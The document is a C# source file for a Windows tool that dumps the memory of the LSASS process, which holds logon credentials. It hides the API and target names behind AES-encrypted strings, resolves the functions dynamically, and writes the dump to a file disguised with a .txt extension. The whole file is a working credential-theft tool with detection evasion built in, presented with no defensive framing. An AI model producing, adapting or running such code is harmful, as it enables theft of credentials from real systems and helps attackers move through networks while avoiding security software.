using System;
using System.IO;
using System.Text;
using System.Security.Principal;
using static CustomD.Configuration;
using static CustomD.HelperFunctions;
using static CustomD.Win32;

namespace CustomD
{
    public class Program
    {
        // Get process by name using NtGetNextProcess and GetProcessImageFileName
        public static int GetByName(string proc_name) {
            // Resolve functions from delegates
            IntPtr k32 = GetLibAddress(Kernel32_enc_str);
            IntPtr ntdll = GetLibAddress(Ntdll_enc_str);
            // Load Psapi.dll library
            LoadLibraryDelegate auxLoadLibrary = (LoadLibraryDelegate)GetFuncDelegate(k32, LoadLibrary_enc_str, typeof(LoadLibraryDelegate));
            String Psapi_dec_str = DecryptStringFromBytes(Psapi_enc_str, Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
            IntPtr psapi = auxLoadLibrary(Psapi_dec_str);
            GetProcessIdDelegate auxGetProcessId =   (GetProcessIdDelegate)GetFuncDelegate(k32, GetProcessId_enc_str, typeof(GetProcessIdDelegate));
            NtGetNextProcessDelegate auxNtGetNextProcess =   (NtGetNextProcessDelegate)GetFuncDelegate(ntdll, NtGetNextProcess_enc_str, typeof(NtGetNextProcessDelegate));
            GetProcessImageFileNameDelegate auxGetProcessImageFileName = (GetProcessImageFileNameDelegate)GetFuncDelegate(psapi, GetProcessImageFileName_enc_str, typeof(GetProcessImageFileNameDelegate));

            // Loop to check each process
            IntPtr aux_handle = IntPtr.Zero;
            int MAXIMUM_ALLOWED = 0x02000000;
            int pid = 0;
            while (!auxNtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, out aux_handle))
            {
                StringBuilder fileName = new StringBuilder(100);
                auxGetProcessImageFileName(aux_handle, fileName, 100);
                char[] stringArray = fileName.ToString().ToCharArray();
                Array.Reverse(stringArray);
                string reversedStr = new string(stringArray);
                string res = reversedStr.Substring(0, reversedStr.IndexOf("\\"));
                stringArray = res.ToString().ToCharArray();
                Array.Reverse(stringArray);
                reversedStr = new string(stringArray);
                if (reversedStr == proc_name)
                {
                    pid = auxGetProcessId(aux_handle);
                    return pid;
                }
            }
            return 0;
        }


        public static void Main(string[] args)
        {
            // Check we are running an elevated process
            if (WindowsIdentity.GetCurrent().Owner
                  .IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid) == false)
            {
                Console.WriteLine("[-] Error: Execute with administrative privileges.");
                return;
            }

            // Resolve functions from delegates
            IntPtr k32 = GetLibAddress(Kernel32_enc_str);
            OpenProcessDelegate auxOpenProcess = (OpenProcessDelegate)GetFuncDelegate(k32, OpenProcess_enc_str, typeof(OpenProcessDelegate));
            LoadLibraryDelegate auxLoadLibrary = (LoadLibraryDelegate)GetFuncDelegate(k32, LoadLibrary_enc_str, typeof(LoadLibraryDelegate));
            // Load dbgcore library
            String Dbgcore_dec_str = DecryptStringFromBytes(Dbgcore_enc_str, Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
            IntPtr dbgc = auxLoadLibrary(Dbgcore_dec_str);
            MinidumpWriteDelegate auxMiniDumpWriteDump = (MinidumpWriteDelegate)GetFuncDelegate(dbgc, MinidumpWriteDump_enc_str, typeof(MinidumpWriteDelegate));

            //Get process PID
            String Lsass_dec_str = DecryptStringFromBytes(Lsass_enc_str, Encoding.ASCII.GetBytes(strings_aes_password), Encoding.ASCII.GetBytes(strings_aes_iv));
            int processPID = GetByName(Lsass_dec_str); // Process.GetProcessesByName(decryptedProcess)[0].Id;
            Console.WriteLine("[+] Process PID: " + processPID);
            
            // Generate the file name or get it from the input arguments
            String filename;
            if (args == null || args.Length == 0)
            {
                // Source: https://docs.microsoft.com/en-us/dotnet/api/system.datetime.tostring?view=net-5.0
                String now = DateTime.Now.ToString("dd-MM-yy-HHmm");
                String extension = ".txt";
                filename = Directory.GetCurrentDirectory() + "\\" + Environment.MachineName + "_" + now + extension;
            }
            else
            {
                filename = args[0];
            }

            // Create output file
            FileStream output_file = new FileStream(filename, FileMode.Create);

            // Open handle to the process
            IntPtr processHandle = auxOpenProcess(PROCESS_VM_READ| PROCESS_QUERY_INFORMATION, false, processPID);

            if (processHandle != INVALID_HANDLE_VALUE)
            {
                Console.WriteLine("[+] Handle to process created correctly.");
                Console.WriteLine(" [+] Process handle: \t\t{0}", processHandle);
                Console.WriteLine(" [+] Process PID: \t\t{0}", processPID);

                // Dump the process            
                bool isRead = auxMiniDumpWriteDump(processHandle, processPID, output_file.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                if (isRead)
                {
                    Console.WriteLine("[+] Successfully dumped. File " + filename);
                }
                else
                {
                    Console.WriteLine("[-] Error: Process not dumped.");
                }
            }
            else
            {
                Console.WriteLine("[-] Error: Handle to process is NULL.");
            }
        }
    }

}